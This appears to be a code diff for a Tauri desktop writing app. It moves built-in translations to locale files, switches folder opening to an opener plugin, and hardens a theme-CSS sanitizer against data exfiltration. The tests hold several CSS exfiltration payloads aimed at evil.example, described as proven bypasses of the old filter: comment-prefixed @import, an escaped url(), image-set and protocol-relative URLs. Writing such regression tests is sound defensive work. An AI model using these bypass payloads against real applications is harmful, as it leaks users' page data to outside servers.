@@ -4,6 +4,7 @@ use std::sync::Mutex;
 use tauri::{Emitter, Manager};
 use tauri_plugin_dialog::DialogExt;
 use tauri_plugin_fs::FsExt;
+use tauri_plugin_opener::OpenerExt;
 
 struct OpenedUrls(Mutex<Option<Vec<tauri::Url>>>);
 
@@ -201,288 +202,18 @@ fn load_locales(app: tauri::AppHandle) -> Result<serde_json::Value, String> {
         std::fs::create_dir_all(&locales_dir).map_err(|e| e.to_string())?;
     }
 
-    // Default translations
-    let zh_hant_json = r#"{
-  "languageName": "正體中文",
-  "ui": {
-    "new": "新增",
-    "open": "開啟",
-    "codex": "冊",
-    "save": "儲存",
-    "export": "匯出",
-    "exportHtml": "匯出 HTML",
-    "exportPdf": "匯出 PDF",
-    "toc": "目錄",
-    "fullscreen": "全螢幕",
-    "exitFullscreen": "退出全螢幕",
-    "writeMode": "撰",
-    "splitMode": "參",
-    "readMode": "閱",
-    "writeModeDesc": "撰：沉浸寫作",
-    "splitModeDesc": "參：邊寫邊對照",
-    "readModeDesc": "閱：閱讀",
-    "recentFiles": "最近檔案",
-    "switchCodex": "切換冊",
-    "openCodexFolder": "開啟冊資料夾",
-    "chars": "字數",
-    "lines": "行數",
-    "render": "渲染",
-    "charsUnit": "字",
-    "linesUnit": "行",
-    "msUnit": "ms",
-    "saved": "已儲存",
-    "unsaved": "未儲存",
-    "unsavedSeal": "未存",
-    "language": "語言",
-    "codexDesc": "冊：資料夾檔案樹",
-    "exportDesc": "匯出選項",
-    "themeDesc": "切換佈景主題",
-    "modeSwitchDesc": "寫作模式",
-    "charsAlt": "ALT",
-    "linesAlt": "HDG",
-    "renderAlt": "ETA",
-    "openLocalesFolder": "開啟語言包資料夾",
-    "importCodexFolder": "匯入冊資料夾",
-    "deleteCodex": "刪除冊"
-  },
-  "dialogs": {
-    "openCodexErrorTitle": "開啟冊失敗",
-    "openCodexErrorMessage": "無法開啟資料夾。",
-    "importCodexErrorTitle": "匯入冊失敗",
-    "importCodexErrorMessage": "無法匯入資料夾。",
-    "deleteCodexConfirmTitle": "刪除冊",
-    "deleteCodexConfirmMessage": "確定要將冊「{name}」從選單中移除嗎？這不會刪除您硬碟上的實際資料夾。",
-    "switchCodexErrorTitle": "開啟冊失敗",
-    "switchCodexErrorMessage": "無法開啟此冊，可能已移動、刪除，或需重新授權；請用「開啟冊」重新選取。",
-    "deleteNonExistentCodexTitle": "此冊已不存在",
-    "deleteNonExistentCodexMessage": "此冊「{name}」可能已被移動或刪除。是否將其從下拉選單中移除？",
-    "deleteLabel": "刪除",
-    "unsavedChangesTitle": "未儲存的變更",
-    "unsavedChangesMessage": "「{file}」有未儲存的變更，要儲存嗎？",
-    "saveLabel": "儲存",
-    "dontSaveLabel": "不儲存",
-    "discardChangesTitle": "放棄變更",
-    "discardChangesMessage": "確定放棄未儲存的變更？",
-    "discardLabel": "放棄變更",
-    "cancelLabel": "取消",
-    "saveFailedTitle": "儲存失敗",
-    "saveFailedMessage": "儲存失敗：{error}",
-    "openFailedTitle": "開啟失敗",
-    "openFailedMessage": "無法開啟檔案：{error}",
-    "copyFailedTitle": "複製失敗",
-    "copyFailedMessage": "複製失敗：{error}",
-    "exportFailedTitle": "匯出失敗",
-    "exportFailedMessage": "匯出失敗：{error}",
-    "exportPdfFailedTitle": "匯出失敗",
-    "exportPdfFailedMessage": "匯出 PDF 失敗：{error}",
-    "renderErrorMessage": "渲染發生錯誤（下次輸入會自動重試）：{error}"
-  },
-  "menu": {
-    "file": "檔案",
-    "new": "新增",
-    "open": "開啟…",
-    "openCodex": "開啟冊資料夾…",
-    "save": "儲存",
-    "saveAs": "另存新檔…",
-    "exportHtml": "匯出 HTML…",
-    "exportPdf": "匯出 PDF…",
-    "edit": "編輯",
-    "undo": "復原",
-    "redo": "重做",
-    "cut": "剪下",
-    "copy": "複製",
-    "paste": "貼上",
-    "selectAll": "全選",
-    "view": "檢視",
-    "focusMode": "專注模式",
-    "typewriterMode": "打字機模式",
-    "theme": "佈景主題",
-    "readingFont": "閱讀字型",
-    "fontSize": "字型大小",
-    "fontIncrease": "放大",
-    "fontDecrease": "縮小",
-    "fontReset": "重設",
-    "toc": "目錄",
-    "fullscreen": "全螢幕閱讀",
-    "copyHtml": "複製為 HTML",
-    "help": "輔助說明",
-    "shortcuts": "鍵盤快捷鍵",
-    "compose": "Compose",
-    "split": "Split",
-    "read": "Read",
-    "themeVolDeNuit": "暗夜飛行",
-    "themeInkstone": "硯台",
-    "themeAuto": "自動",
-    "fontDefault": "預設",
-    "fontSerif": "襯線體",
-    "fontSans": "無襯線體",
-    "fontMono": "等寬體"
-  },
-  "shortcuts": {
-    "fileGroup": "檔案",
-    "newFile": "新增檔案",
-    "openFile": "開啟檔案",
-    "save": "儲存",
-    "saveAs": "另存新檔",
-    "exportPdf": "匯出 PDF",
-    "viewGroup": "檢視",
-    "toggleEditRead": "切換編輯／閱讀",
-    "fontGroup": "字型",
-    "increaseFont": "放大字型",
-    "decreaseFont": "縮小字型",
-    "resetFont": "重設字型大小",
-    "toolsGroup": "工具",
-    "copyHtml": "複製為 HTML",
-    "exitFullscreen": "退出全螢幕",
-    "shortcutsTip": "快捷鍵提示",
-    "overlayTitle": "Keyboard Shortcuts"
-  }
-}"#;
-
-    let en_json = r#"{
-  "languageName": "English",
-  "ui": {
-    "new": "New",
-    "open": "Open",
-    "codex": "Codex",
-    "save": "Save",
-    "export": "Export",
-    "exportHtml": "Export HTML",
-    "exportPdf": "Export PDF",
-    "toc": "TOC",
-    "fullscreen": "Fullscreen",
-    "exitFullscreen": "Exit Fullscreen",
-    "writeMode": "Write",
-    "splitMode": "Split",
-    "readMode": "Read",
-    "writeModeDesc": "Write: Immersive mode",
-    "splitModeDesc": "Split: Compare mode",
-    "readModeDesc": "Read: Reading mode",
-    "recentFiles": "Recent Files",
-    "switchCodex": "Switch Codex",
-    "openCodexFolder": "Open Codex Folder",
-    "chars": "Chars",
-    "lines": "Lines",
-    "render": "Render",
-    "charsUnit": " chars",
-    "linesUnit": " lines",
-    "msUnit": "ms",
-    "saved": "Saved",
-    "unsaved": "Unsaved",
-    "unsavedSeal": "Dirty",
-    "language": "Language",
-    "codexDesc": "Codex: folder tree",
-    "exportDesc": "Export options",
-    "themeDesc": "Switch theme",
-    "modeSwitchDesc": "Writing mode",
-    "charsAlt": "ALT",
-    "linesAlt": "HDG",
-    "renderAlt": "ETA",
-    "openLocalesFolder": "Open Locales Folder",
-    "importCodexFolder": "Import Codex Folder",
-    "deleteCodex": "Delete Codex"
-  },
-  "dialogs": {
-    "openCodexErrorTitle": "Open Codex Failed",
-    "openCodexErrorMessage": "Cannot open folder.",
-    "importCodexErrorTitle": "Import Codex Failed",
-    "importCodexErrorMessage": "Cannot import folder.",
-    "deleteCodexConfirmTitle": "Delete Codex",
-    "deleteCodexConfirmMessage": "Are you sure you want to remove the codex '{name}' from the menu? This will not delete the folder on your hard drive.",
-    "switchCodexErrorTitle": "Open Codex Failed",
-    "switchCodexErrorMessage": "Cannot open this codex, it might have been moved, deleted, or needs re-authorization. Please use 'Open Codex Folder' to re-select.",
-    "deleteNonExistentCodexTitle": "Codex Does Not Exist",
-    "deleteNonExistentCodexMessage": "This codex '{name}' might have been moved or deleted. Do you want to remove it from the menu?",
-    "deleteLabel": "Delete",
-    "unsavedChangesTitle": "Unsaved Changes",
-    "unsavedChangesMessage": "\"{file}\" has unsaved changes. Do you want to save them?",
-    "saveLabel": "Save",
-    "dontSaveLabel": "Don't Save",
-    "discardChangesTitle": "Discard Changes",
-    "discardChangesMessage": "Are you sure you want to discard unsaved changes?",
-    "discardLabel": "Discard Changes",
-    "cancelLabel": "Cancel",
-    "saveFailedTitle": "Save Failed",
-    "saveFailedMessage": "Save failed: {error}",
-    "openFailedTitle": "Open Failed",
-    "openFailedMessage": "Cannot open file: {error}",
-    "copyFailedTitle": "Copy Failed",
-    "copyFailedMessage": "Copy failed: {error}",
-    "exportFailedTitle": "Export Failed",
-    "exportFailedMessage": "Export failed: {error}",
-    "exportPdfFailedTitle": "Export Failed",
-    "exportPdfFailedMessage": "Export PDF failed: {error}",
-    "renderErrorMessage": "Render error (will retry automatically on next input): {error}"
-  },
-  "menu": {
-    "file": "File",
-    "new": "New",
-    "open": "Open…",
-    "openCodex": "Open Codex Folder…",
-    "save": "Save",
-    "saveAs": "Save As…",
-    "exportHtml": "Export HTML…",
-    "exportPdf": "Export PDF…",
-    "edit": "Edit",
-    "undo": "Undo",
-    "redo": "Redo",
-    "cut": "Cut",
-    "copy": "Copy",
-    "paste": "Paste",
-    "selectAll": "Select All",
-    "view": "View",
-    "focusMode": "Focus Mode",
-    "typewriterMode": "Typewriter Mode",
-    "theme": "Theme",
-    "readingFont": "Reading Font",
-    "fontSize": "Font Size",
-    "fontIncrease": "Increase",
-    "fontDecrease": "Decrease",
-    "fontReset": "Reset",
-    "toc": "Table of Contents",
-    "fullscreen": "Fullscreen Reading",
-    "copyHtml": "Copy as HTML",
-    "help": "Help",
-    "shortcuts": "Keyboard Shortcuts",
-    "compose": "Compose",
-    "split": "Split",
-    "read": "Read",
-    "themeVolDeNuit": "Night Flight",
-    "themeInkstone": "Inkstone",
-    "themeAuto": "Auto",
-    "fontDefault": "Default",
-    "fontSerif": "Serif",
-    "fontSans": "Sans-serif",
-    "fontMono": "Monospace"
-  },
-  "shortcuts": {
-    "fileGroup": "File",
-    "newFile": "New File",
-    "openFile": "Open File",
-    "save": "Save",
-    "saveAs": "Save As",
-    "exportPdf": "Export PDF",
-    "viewGroup": "View",
-    "toggleEditRead": "Toggle Edit/Read",
-    "fontGroup": "Font",
-    "increaseFont": "Increase Font Size",
-    "decreaseFont": "Decrease Font Size",
-    "resetFont": "Reset Font Size",
-    "toolsGroup": "Tools",
-    "copyHtml": "Copy as HTML",
-    "exitFullscreen": "Exit Fullscreen",
-    "shortcutsTip": "Shortcuts Helper",
-    "overlayTitle": "Keyboard Shortcuts"
-  }
-}"#;
+    // 翻譯真相唯一來源是 repo 的 locales/*.json（前端 i18n.ts 亦 import 同一組檔案，
+    // 編譯期內嵌保證兩端同步）。此處只在使用者語言包不存在時種下初始檔。
+    const ZH_HANT_JSON: &str = include_str!("../../locales/zh_Hant.json");
+    const EN_JSON: &str = include_str!("../../locales/en.json");
 
     let zh_hant_path = locales_dir.join("zh_Hant.json");
     if !zh_hant_path.exists() {
-        let _ = std::fs::write(&zh_hant_path, zh_hant_json);
+        let _ = std::fs::write(&zh_hant_path, ZH_HANT_JSON);
     }
     let en_path = locales_dir.join("en.json");
     if !en_path.exists() {
-        let _ = std::fs::write(&en_path, en_json);
+        let _ = std::fs::write(&en_path, EN_JSON);
     }
 
     // Read all JSON files in the locales directory
@@ -528,28 +259,9 @@ fn open_locales_dir(app: tauri::AppHandle) -> Result<(), String> {
     if !locales_dir.exists() {
         std::fs::create_dir_all(&locales_dir).map_err(|e| e.to_string())?;
     }
-    #[cfg(target_os = "macos")]
-    {
-        std::process::Command::new("open")
-            .arg(&locales_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    #[cfg(target_os = "windows")]
-    {
-        std::process::Command::new("explorer")
-            .arg(&locales_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    #[cfg(target_os = "linux")]
-    {
-        std::process::Command::new("xdg-open")
-            .arg(&locales_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    Ok(())
+    app.opener()
+        .open_path(locales_dir.to_string_lossy(), None::<&str>)
+        .map_err(|e| e.to_string())
 }
 
 #[derive(serde::Serialize, serde::Deserialize, Clone, Debug)]
@@ -561,41 +273,174 @@ pub struct CustomTheme {
     pub file_path: String,
 }
 
-// Strip external url() references from theme CSS to prevent CSS exfiltration
+// Strip external resource references from theme CSS to prevent CSS exfiltration
 // (attribute selectors + background-image can leak DOM data to attacker servers).
 // Only data: URIs are allowed; @import is stripped entirely.
+//
+// 三階段，順序不可換——前兩階段各自封掉一種曾實測繞過整個過濾器的偽裝：
+//   1. 移除註解：`/*x*/@import "https://…"` 曾讓 @import 行過濾失效
+//   2. 解碼 escape：`\75 rl("https://…")` 對 CSS 引擎等價於 url()，但躲得過字面比對
+//   3. 剝除外部 URL：對「URL 本身」下手而非函式名，故 image-set() 這類
+//      不經 url() 的載入函式一併涵蓋，不必逐一追黑名單
+//
+// 注意這是 best-effort 的深度防禦，不是安全邊界：CSP 的 img-src 含萬用 `https:`
+// （Markdown 外部圖片所需），故此函式是自訂主題外連的唯一防線。
 fn sanitize_theme_css(css: &str) -> String {
+    let decommented = strip_css_comments(css);
+    let decoded = decode_css_escapes(&decommented);
+    strip_external_urls(&decoded)
+}
+
+// 移除 /* */ 註解。字串內的 /* 不算註解，故需追蹤引號狀態。
+// 註解替換為空白而非直接刪除，避免 `a/**/b` 黏合成新 token。
+fn strip_css_comments(css: &str) -> String {
+    let mut out = String::with_capacity(css.len());
+    let mut chars = css.chars().peekable();
+    let mut in_string: Option<char> = None;
+
+    while let Some(c) = chars.next() {
+        match in_string {
+            Some(quote) => {
+                out.push(c);
+                if c == '\\' {
+                    if let Some(escaped) = chars.next() {
+                        out.push(escaped);
+                    }
+                } else if c == quote {
+                    in_string = None;
+                }
+            }
+            None => {
+                if c == '/' && chars.peek() == Some(&'*') {
+                    chars.next();
+                    let mut prev = '\0';
+                    for cur in chars.by_ref() {
+                        if prev == '*' && cur == '/' {
+                            break;
+                        }
+                        prev = cur;
+                    }
+                    out.push(' ');
+                } else {
+                    if c == '"' || c == '\'' {
+                        in_string = Some(c);
+                    }
+                    out.push(c);
+                }
+            }
+        }
+    }
+    out
+}
+
+// 解碼 CSS escape：`\` + 1-6 hex（可跟一個終止空白）→ 該 code point；`\` + 其他字元 → 該字元。
+// 正規化後 `\75 rl(` 還原為 `url(`，才輪得到下一階段的比對。
+fn decode_css_escapes(css: &str) -> String {
+    let mut out = String::with_capacity(css.len());
+    let mut chars = css.chars().peekable();
+
+    while let Some(c) = chars.next() {
+        if c != '\\' {
+            out.push(c);
+            continue;
+        }
+        let mut hex = String::new();
+        while hex.len() < 6 {
+            match chars.peek() {
+                Some(h) if h.is_ascii_hexdigit() => {
+                    hex.push(*h);
+                    chars.next();
+                }
+                _ => break,
+            }
+        }
+        if hex.is_empty() {
+            if let Some(literal) = chars.next() {
+                out.push(literal);
+            }
+        } else {
+            // CSS 規範：hex escape 後的單一空白是終止符，不是內容
+            if chars.peek().is_some_and(|c| c.is_whitespace()) {
+                chars.next();
+            }
+            if let Some(decoded) = u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
+                out.push(decoded);
+            }
+        }
+    }
+    out
+}
+
+// 外部 URL 判定：含 `//`（scheme 分隔或 protocol-relative）即視為外部。
+// data: URI 豁免——其 base64 內容本就可能含 `//`。
+fn is_external_url(value: &str) -> bool {
+    let trimmed = value.trim();
+    trimmed.contains("//") && !trimmed.starts_with("data:")
+}
+
+fn strip_external_urls(css: &str) -> String {
     let mut result = String::with_capacity(css.len());
     let mut chars = css.char_indices().peekable();
 
-    while let Some(&(i, _)) = chars.peek() {
-        let is_url = css.get(i..i + 4).map(|s| s.eq_ignore_ascii_case("url(")).unwrap_or(false);
-        if is_url {
+    while let Some(&(i, c)) = chars.peek() {
+        // url(...)：維持原規則，只允許 data: 與空值（相對路徑一併清除）
+        if css.get(i..i + 4).is_some_and(|s| s.eq_ignore_ascii_case("url(")) {
             result.push_str("url(");
-            for _ in 0..4 { chars.next(); }
+            for _ in 0..4 {
+                chars.next();
+            }
             let mut inside = String::new();
             let mut depth = 1;
-            while let Some((_, c)) = chars.next() {
-                if c == ')' { depth -= 1; if depth == 0 { break; } }
-                if c == '(' { depth += 1; }
-                inside.push(c);
+            for (_, ch) in chars.by_ref() {
+                if ch == ')' {
+                    depth -= 1;
+                    if depth == 0 {
+                        break;
+                    }
+                }
+                if ch == '(' {
+                    depth += 1;
+                }
+                inside.push(ch);
             }
             let trimmed = inside.trim().trim_matches(|c: char| c == '"' || c == '\'');
             if trimmed.is_empty() || trimmed.starts_with("data:") {
                 result.push_str(&inside);
             }
             result.push(')');
-        } else {
-            let (_, c) = chars.next().unwrap();
-            result.push(c);
+            continue;
         }
+        // 引號字串：僅清空含外部 URL 者。image-set("https://…") 這類走這條，
+        // 而 font-family: "JetBrains Mono" 不受影響。
+        if c == '"' || c == '\'' {
+            let quote = c;
+            chars.next();
+            let mut inner = String::new();
+            for (_, ch) in chars.by_ref() {
+                if ch == quote {
+                    break;
+                }
+                inner.push(ch);
+            }
+            result.push(quote);
+            if !is_external_url(&inner) {
+                result.push_str(&inner);
+            }
+            result.push(quote);
+            continue;
+        }
+        chars.next();
+        result.push(c);
     }
 
-    result.lines()
+    // @import 整行剝除（註解已於階段 1 移除，此處 trim_start 即足夠）
+    result
+        .lines()
         .filter(|line| {
-            let stripped = line.trim_start();
-            let without_comments = stripped.trim_start_matches(|c: char| c == '/' || c == '*' || c.is_whitespace());
-            !without_comments.get(..7).map(|s| s.eq_ignore_ascii_case("@import")).unwrap_or(false)
+            !line
+                .trim_start()
+                .get(..7)
+                .is_some_and(|s| s.eq_ignore_ascii_case("@import"))
         })
         .collect::<Vec<_>>()
         .join("\n")
@@ -823,28 +668,9 @@ fn open_themes_dir(app: tauri::AppHandle) -> Result<(), String> {
     if !themes_dir.exists() {
         std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
     }
-    #[cfg(target_os = "macos")]
-    {
-        std::process::Command::new("open")
-            .arg(&themes_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    #[cfg(target_os = "windows")]
-    {
-        std::process::Command::new("explorer")
-            .arg(&themes_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    #[cfg(target_os = "linux")]
-    {
-        std::process::Command::new("xdg-open")
-            .arg(&themes_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    Ok(())
+    app.opener()
+        .open_path(themes_dir.to_string_lossy(), None::<&str>)
+        .map_err(|e| e.to_string())
 }
 
 #[tauri::command]
@@ -1006,4 +832,85 @@ pub fn run() {
             let _ = app_handle.emit("file-open", &paths);
         }
     });
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // 以下四個 payload 皆為實測繞過舊版 sanitizer、並在真實瀏覽器引擎確認會發出
+    // 外連請求的形式（2026-07-26 取證）。CSP 的 img-src 含萬用 `https:`，擋不住這些。
+    #[test]
+    fn blocks_proven_exfiltration_bypasses() {
+        let payloads = [
+            // 註解前綴讓 @import 躲過行首比對
+            r#"/*x*/@import "https://evil.example/x.css";"#,
+            r#"/*a*/ @import "https://evil.example/x.css";"#,
+            // escape sequence 對 CSS 引擎等價於 url()
+            r#"body { background: \75 rl("https://evil.example/leak.png"); }"#,
+            // image-set 系列根本不含 "url(" 字面
+            r#"body { background-image: image-set("https://evil.example/is.png" 1x); }"#,
+            r#"body { background-image: -webkit-image-set("https://evil.example/w.png" 1x); }"#,
+            // 直接形式（舊版已擋，防回歸）
+            r#"@import "https://evil.example/x.css";"#,
+            r#"body { background: url("https://evil.example/leak.png"); }"#,
+            // protocol-relative
+            r#"body { background: url(//evil.example/leak.png); }"#,
+        ];
+        for payload in payloads {
+            let out = sanitize_theme_css(payload);
+            assert!(
+                !out.contains("evil.example"),
+                "payload 未被擋下:\n  輸入: {payload}\n  輸出: {out}"
+            );
+        }
+    }
+
+    #[test]
+    fn preserves_legitimate_theme_css() {
+        let css = r#"html[data-theme="x"] {
+  --bg: #0d1b1e;
+  --font-ui: "JetBrains Mono", ui-monospace, monospace;
+}
+html[data-theme="x"] body {
+  background: radial-gradient(1.5px 1.5px at 70% 8%, rgba(78, 204, 163, 0.35), transparent 60%), var(--bg);
+}"#;
+        let out = sanitize_theme_css(css);
+        assert!(out.contains("--bg: #0d1b1e;"), "CSS 變數被破壞: {out}");
+        assert!(out.contains(r#""JetBrains Mono""#), "字型名被誤清: {out}");
+        assert!(out.contains("radial-gradient"), "漸層被破壞: {out}");
+        assert!(out.contains("rgba(78, 204, 163, 0.35)"), "色值被破壞: {out}");
+    }
+
+    #[test]
+    fn preserves_data_uri() {
+        let css = r#"body { background: url("data:image/svg+xml;base64,PHN2Zy8+"); }"#;
+        let out = sanitize_theme_css(css);
+        assert!(out.contains("PHN2Zy8+"), "data: URI 應保留: {out}");
+    }
+
+    // 內建模板是使用者「複製為範本」的起點，淨化後不得變質。
+    #[test]
+    fn builtin_templates_survive_sanitizer() {
+        for (name, template) in [
+            ("emerald", TEMPLATE_EMERALD_FOREST),
+            ("nordic", TEMPLATE_NORDIC_FROST),
+            ("office97", TEMPLATE_OFFICE_97),
+        ] {
+            let out = sanitize_theme_css(template);
+            // 註解移除與 escape 解碼會改變空白/字面，故比對關鍵宣告而非全等
+            assert!(out.contains("--bg:"), "{name} 的 --bg 遺失: {out}");
+            assert!(
+                out.matches('{').count() == template.matches('{').count(),
+                "{name} 的 rule 數量改變"
+            );
+        }
+    }
+
+    #[test]
+    fn theme_name_survives_comment_stripping() {
+        // parse_theme_name 讀原始檔（非淨化後），此測試確認兩者職責未混淆
+        let raw = "/* Theme Name: 翠綠森林 */\nhtml { --bg: #000; }";
+        assert_eq!(parse_theme_name(raw, "fallback"), "翠綠森林");
+    }
 }
